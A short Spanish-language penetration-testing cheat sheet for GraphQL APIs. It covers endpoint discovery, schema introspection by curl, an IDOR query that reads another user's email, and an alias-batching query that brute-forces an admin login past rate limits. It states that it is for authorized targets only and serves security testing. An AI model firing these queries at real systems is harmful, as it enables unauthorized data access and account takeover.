# Cheatsheet · GraphQL

Explicación en `../../01-web/api/graphql.md`. **Solo sobre objetivos autorizados.**

## Localizar endpoint

```
/graphql  /api/graphql  /v1/graphql  /graphql/console  /graphiql
```

## Introspección (volcar el esquema)

```graphql
query { __schema { types { name fields { name } } } }
```

```bash
curl -s -X POST https://sitio/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name}}}"}'
```

## Enumerar tipos / campos

```graphql
{ __type(name:"User") { name fields { name type { name } } } }
```

## Abusos

```graphql
# IDOR/BOLA: pide objetos por ID sin autorización
{ user(id: 1002) { email } }

# Batching / aliases (saltar rate limit, fuerza bruta)
{ a: login(user:"admin", pass:"1"){token}
  b: login(user:"admin", pass:"2"){token} }
```

## Herramientas

```
graphw00f    # fingerprint del motor
InQL         # extensión de Burp
clairvoyance # reconstruir esquema si introspección está off
```

## Notas

- Si la introspección está deshabilitada, prueba clairvoyance o campos por diccionario.
- Revisa inyecciones clásicas (SQLi/NoSQL) dentro de los argumentos.
